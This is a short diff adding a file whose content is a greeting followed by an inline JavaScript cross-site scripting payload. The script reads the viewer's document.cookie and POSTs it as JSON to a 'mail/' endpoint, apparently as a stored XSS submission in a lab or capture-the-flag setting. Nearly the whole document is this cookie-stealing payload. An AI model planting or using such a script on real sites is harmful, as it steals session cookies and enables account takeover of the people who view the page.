@@ -1,0 +1,10 @@
+Hi!
+<script type="text/javascript">
+xhr = new XMLHttpRequest(); 
+xhr.open("POST", 'mail/', true); 
+xhr.setRequestHeader("Content-type", "application/json"); 
+var obj = new Object();
+obj.content = document.cookie;
+answer = JSON.stringify(obj);
+xhr.send(answer)
+</script>
